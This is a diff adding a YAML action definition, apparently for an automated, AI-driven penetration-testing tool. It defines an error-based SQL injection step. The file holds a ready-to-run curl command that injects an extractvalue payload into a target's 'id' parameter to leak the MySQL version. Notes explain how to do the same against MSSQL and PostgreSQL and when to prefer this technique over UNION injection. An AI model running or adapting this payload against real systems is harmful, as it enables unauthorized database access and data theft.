@@ -1,0 +1,16 @@
+name: sqli_error
+category: web
+description: Error-based SQL injection
+preconditions:
+  - service.port==80
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "curl -s '{target_url}?id=1 AND extractvalue(1,concat(0x7e,(SELECT version())))'"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "Error-based: force DB error that includes query result. MySQL: extractvalue/updatexml. MSSQL: convert(). PostgreSQL: cast(). Useful when UNION blocked."
